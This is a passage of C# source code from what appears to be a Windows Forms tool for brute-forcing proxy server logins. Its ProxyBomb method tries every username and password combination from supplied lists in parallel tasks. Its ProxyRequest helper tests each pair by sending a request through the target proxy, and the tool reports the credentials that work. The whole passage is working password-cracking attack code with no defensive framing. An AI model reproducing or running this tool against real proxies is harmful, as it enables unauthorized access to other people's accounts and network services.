            }
        }
        private void ProxyBomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = ProxyRequest(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            Thread.Sleep(1000);
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool ProxyRequest(string host,string user,string password)
        {
            try
            {
                WebProxy proxyObject = new WebProxy(host);
                proxyObject.Credentials = new NetworkCredential(user, password);
                HttpWebRequest Req = (HttpWebRequest)WebRequest.Create("https://www.baidu.com/");
                Req.UserAgent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; QQWubi 133; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CIBA; InfoPath.2)";//UA
                Req.Proxy = proxyObject;
                Req.UseDefaultCredentials = true;
                Req.Method = "GET";
                Req.Timeout = 2000;
                HttpWebResponse Resp = (HttpWebResponse)Req.GetResponse();
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}